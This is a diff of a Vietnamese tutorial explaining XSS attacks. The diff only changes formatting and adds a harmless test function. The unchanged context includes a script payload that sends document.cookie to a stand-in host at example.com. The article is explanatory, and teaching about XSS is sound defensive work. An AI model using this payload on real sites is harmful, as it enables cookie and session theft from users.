@@ -12,8 +12,11 @@ Mục đích chính của cuộc tấn công này là ăn cắp dữ liệu nh�
 ```<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>```
 
 cookies
-session
+
+`session`
+
 token
+
 các thông tin khác....
 Trong hầu hết các trường hợp, cuộc tấn công này đang được sử dụng để ăn cắp cookie của người khác.
 
@@ -31,6 +34,12 @@ Tấn công XSS đang được thực hiện ở phía client.
 Nó có thể được thực hiện với các ngôn ngữ lập trình phía client khác nhau.
 
 Tuy nhiên, thường xuyên nhất cuộc tấn công này được thực hiện với Javascript và HTML.
+
+```
+function test() {
+  console.log("notice the blank line before this function?");
+}
+```
 
 2. XSS được thực hiện như thế nào?
 Tấn công XSS là gửi và chèn script độc hại, những mã độc này được viết bằng các ngôn ngữ ở client như Javascript, HTML, CSS VBScript,... Tuy nhiên phổ biến nhất là Javascript và HTML. Có rất nhiều các thức để thực hiện cuộc tấn công này, phụ thuộc vào nhiều trường hợp khác nhau.
